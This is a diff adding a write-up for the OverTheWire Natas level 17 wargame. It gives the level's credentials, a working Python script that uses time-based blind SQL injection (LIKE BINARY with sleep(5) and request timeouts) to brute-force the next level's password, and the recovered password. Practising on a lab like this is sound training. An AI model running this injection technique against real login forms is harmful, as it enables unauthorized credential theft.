@@ -1,0 +1,41 @@
+URL: http://natas17.natas.labs.overthewire.org
+user: natas17
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+Blind SQL Injection. Query check if user exists, table contains username and password.
+User natas18 exists, we need to brute-force the password.
+We have no visual output. We add a timer and time out.
+
+#!/usr/bin/env python
+import requests
+
+possible_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+auth=('natas17', password)
+
+used_chars = ''
+
+for char in possible_chars:
+    payload = {'username': ('natas18" AND password LIKE BINARY "%%%c%%" and sleep(5) and "1"="1' % char)}
+    try:
+        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug=1', auth=auth, data=payload, timeout=1)
+    except requests.exceptions.Timeout:
+        used_chars += char
+
+print used_chars
+
+cracked_pass = ''
+for i in range(32):
+    for char in used_chars:
+        new_pass = cracked_pass + char
+        payload = {'username': ('natas18" AND password LIKE BINARY "%s%%" and sleep(5) and "1"="1' % new_pass)}
+        try:
+            r = requests.post(
+                'http://natas17.natas.labs.overthewire.org/index.php?debug=1',
+                auth=auth, data=payload, timeout=1)
+        except requests.exceptions.Timeout:
+            cracked_pass += char
+            print cracked_pass
+            break
+
+natas18 pass: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
